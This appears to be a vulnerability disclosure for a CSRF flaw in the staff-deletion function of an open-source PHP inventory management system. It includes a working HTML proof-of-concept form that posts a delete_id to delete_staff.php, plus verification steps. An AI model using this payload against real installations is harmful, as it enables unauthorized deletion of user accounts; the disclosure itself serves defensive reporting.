## Vulnerability Description

Free open source inventory management system v1.0 has CSRF vulnerability in /index.php? page=staff_list under the site. It is an open source project from https://www.sourcecodester.com/. This vulnerability allows an attacker to execute a web script by injecting an elaborate payload of the delete_id parameter that can delete data from any member.

1. BUG_Author: xxxxfang
  
2. vendors: [Free and Open Source inventory management system php source code](https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html)
  
3. The program is built using the phpstudy/v8.1.1.3 and PHP/7.3.4 version;
  
4. Vulnerability location: /ample/index.php?page=staff_list


# Vulnerability Verification

POCï¼š

```js
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/ample/app/action/delete_staff.php" method="POST">
      <-- value equals the id of a member -->
      <input type="hidden" name="delete&#95;id" value="6" />
      <input type="hidden" name="delete&#95;data" value="delete&#95;data" />
      <input type="submit" value="Delete Member" />
    </form>
  </body>
</html>
```

## How to verify

Follow the steps provided by the source code author (first log in to the background management system using the default account password, then create a worker account) to build the vulnerability environment and execute the Payload provided above.

The vulnerability lies in the "Delete staff member" function, as shown below:

![image-20231218220020341](C:\Users\fang\AppData\Roaming\Typora\typora-user-images\image-20231218220020341.png)



Click the delete button to get the data packet, and use "delete_id" to construct POC and execute CSRF script:

![image-20231218221643466](C:\Users\fang\AppData\Roaming\Typora\typora-user-images\image-20231218221643466.png)



![image-20231218221724609](C:\Users\fang\AppData\Roaming\Typora\typora-user-images\image-20231218221724609.png)



Result:

Description The member whose ID equals 6 was successfully deleted

![image-20231218221951903](C:\Users\fang\AppData\Roaming\Typora\typora-user-images\image-20231218221951903.png)